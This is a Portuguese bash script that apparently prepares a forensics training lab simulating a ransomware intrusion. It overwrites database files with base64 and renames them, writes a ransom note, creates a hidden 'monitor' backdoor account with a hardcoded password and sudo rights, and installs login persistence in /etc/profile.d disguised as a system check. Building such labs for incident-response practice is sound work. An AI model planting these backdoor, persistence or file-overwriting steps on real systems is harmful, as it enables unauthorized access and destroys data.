#!/bin/bash
# Script de Preparacao do Laboratorio Final - Aula 4.4
# Operacao BlackVault - Cenario de ransomware com persistencia via login
# Executar como root (sudo su -)

# ============================================================
# Verificacao inicial: precisa ser root
# ============================================================

if [ "$EUID" -ne 0 ]; then
    echo "=========================================="
    echo "  ERRO: Este script precisa ser executado como root"
    echo "  Execute: sudo su -"
    echo "  Depois: ./aula4_4_setup_final.sh"
    echo "=========================================="
    exit 1
fi

echo "=========================================="
echo "  LABORATORIO FINAL - LINUX"
echo "  Operacao BlackVault - Aula 4.4"
echo "=========================================="
echo ""

ALL_SUCCESS=true

# ============================================================
# Funcao: ofuscar conteudo de um arquivo (simula criptografia)
# ============================================================

obfuscate_file() {
    local file_path="$1"
    if [ -f "$file_path" ]; then
        local base64_content=$(base64 "$file_path")
        {
            echo "BLACKVAULT-ENCRYPTED-AES256"
            echo "$base64_content"
        } > "$file_path"
    fi
}

# ============================================================
# 1. Criptografar arquivos em /data/db
# ============================================================

echo "[1/4] Criptografando arquivos de /data/db..."

for FILE in clientes.mdf vendas.ldf produtos.mdf; do
    FILEPATH="/data/db/$FILE"
    ENCRYPTEDPATH="/data/db/$FILE.blackvault"
    
    if [ -f "$FILEPATH" ]; then
        # Se o .blackvault ja existe, remover antes de renomear
        if [ -f "$ENCRYPTEDPATH" ]; then
            rm -f "$ENCRYPTEDPATH"
        fi
        
        # Ofuscar o conteudo
        obfuscate_file "$FILEPATH"
        
        # Renomear para .blackvault
        mv "$FILEPATH" "$ENCRYPTEDPATH"
        echo "  [OK] Criptografado: $FILE -> $FILE.blackvault"
    elif [ -f "$ENCRYPTEDPATH" ]; then
        # Verificar se o conteudo ja esta ofuscado
        if head -1 "$ENCRYPTEDPATH" | grep -q "BLACKVAULT-ENCRYPTED-AES256"; then
            echo "  [OK] Ja criptografado: $FILE.blackvault"
        else
            # Esta com conteudo legivel, ofuscar agora
            obfuscate_file "$ENCRYPTEDPATH"
            echo "  [OK] Ofuscado: $FILE.blackvault (conteudo estava legivel)"
        fi
    else
        echo "  [!] Arquivo nao encontrado: $FILEPATH"
    fi
done

# Criar nota de resgate (sempre reescreve)
cat > /data/db/README_BLACKVAULT.txt << 'EOF'
==========================================
        OPERACAO BLACKVAULT
==========================================

Todos os seus arquivos de banco de dados
foram criptografados.

Para recuperar seus dados, pague 15 BTC para:
  1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

Contato: blackvault@protonmail.com
ID da vitima: BV-2026-0619-042

PRAZO: 48 horas.

NAO TENTE recuperar sozinho.
NAO CONTATE a policia.

==========================================
EOF

if [ -f "/data/db/README_BLACKVAULT.txt" ]; then
    echo "  [OK] Nota de resgate criada"
else
    echo "  [ERRO] Falha ao criar nota de resgate"
    ALL_SUCCESS=false
fi

# ============================================================
# 2. Criar conta backdoor monitor
# ============================================================

echo "[2/4] Criando conta backdoor monitor..."

if id "monitor" &>/dev/null; then
    echo "  [OK] Usuario monitor ja existe"
else
    useradd -m -s /bin/bash -c "Monitor Service Account" monitor
    echo "monitor:Backup@2026" | chpasswd
    
    if id "monitor" &>/dev/null; then
        echo "  [OK] Usuario monitor criado"
    else
        echo "  [ERRO] Falha ao criar usuario monitor"
        ALL_SUCCESS=false
    fi
fi

# Adicionar ao grupo sudo
if groups monitor 2>/dev/null | grep -qw "sudo"; then
    echo "  [OK] monitor ja esta em sudo"
else
    usermod -aG sudo monitor
    
    if groups monitor 2>/dev/null | grep -qw "sudo"; then
        echo "  [OK] monitor adicionado a sudo"
    else
        echo "  [ERRO] Falha ao adicionar monitor a sudo"
        ALL_SUCCESS=false
    fi
fi

# ============================================================
# 3. Criar binario do backdoor
# ============================================================

echo "[3/4] Criando binario do backdoor..."

cat > /tmp/.monitor-agent << 'EOF'
#!/bin/bash
LOG_FILE="/tmp/.monitor-agent.log"
while true; do
    echo "$(date) - monitor-agent executado (PID: $$)" >> "$LOG_FILE"
    sleep 60
done
EOF

chmod +x /tmp/.monitor-agent

if [ -x "/tmp/.monitor-agent" ]; then
    echo "  [OK] Binario criado: /tmp/.monitor-agent"
else
    echo "  [ERRO] Falha ao criar binario"
    ALL_SUCCESS=false
fi

# ============================================================
# 4. Criar script em /etc/profile.d/ (persistencia via login)
# ============================================================

echo "[4/4] Criando script em /etc/profile.d/..."

cat > /etc/profile.d/01-lsb-check.sh << 'EOF'
#!/bin/bash
# LSB check - verifica conformidade do sistema

if [ -x /tmp/.monitor-agent ]; then
    nohup /tmp/.monitor-agent > /dev/null 2>&1 &
fi
EOF

chmod +x /etc/profile.d/01-lsb-check.sh

if [ -f "/etc/profile.d/01-lsb-check.sh" ]; then
    echo "  [OK] Script /etc/profile.d/01-lsb-check.sh criado"
else
    echo "  [ERRO] Falha ao criar script /etc/profile.d/01-lsb-check.sh"
    ALL_SUCCESS=false
fi

# ============================================================
# Verificacao final
# ============================================================

echo ""
echo "=========================================="
if [ "$ALL_SUCCESS" = true ]; then
    echo "  LABORATORIO PRONTO - LINUX"
else
    echo "  LABORATORIO COM ERROS - VERIFIQUE ACIMA"
fi
echo "=========================================="
echo ""
echo "Verificacao de artefatos:"
echo ""

if [ -f "/data/db/README_BLACKVAULT.txt" ]; then
    echo "  [OK] Nota de resgate"
else
    echo "  [ ] Nota de resgate NAO CRIADA"
fi

ENCRYPTED_COUNT=$(ls /data/db/*.blackvault 2>/dev/null | wc -l)
if [ "$ENCRYPTED_COUNT" -gt 0 ]; then
    echo "  [OK] Arquivos criptografados: $ENCRYPTED_COUNT arquivos"
else
    echo "  [ ] Arquivos .blackvault NAO CRIADOS"
fi

if id "monitor" &>/dev/null; then
    echo "  [OK] Conta backdoor: monitor"
else
    echo "  [ ] Conta monitor NAO CRIADA"
fi

if groups monitor 2>/dev/null | grep -qw "sudo"; then
    echo "  [OK] monitor em sudo"
else
    echo "  [ ] monitor NAO esta em sudo"
fi

if [ -x "/tmp/.monitor-agent" ]; then
    echo "  [OK] Binario: /tmp/.monitor-agent"
else
    echo "  [ ] Binario NAO CRIADO"
fi

if [ -f "/etc/profile.d/01-lsb-check.sh" ]; then
    echo "  [OK] Script de login: /etc/profile.d/01-lsb-check.sh"
else
    echo "  [ ] Script de login NAO CRIADO"
fi

echo ""
echo "Agora investigue! Use os comandos da Aula 4.4."
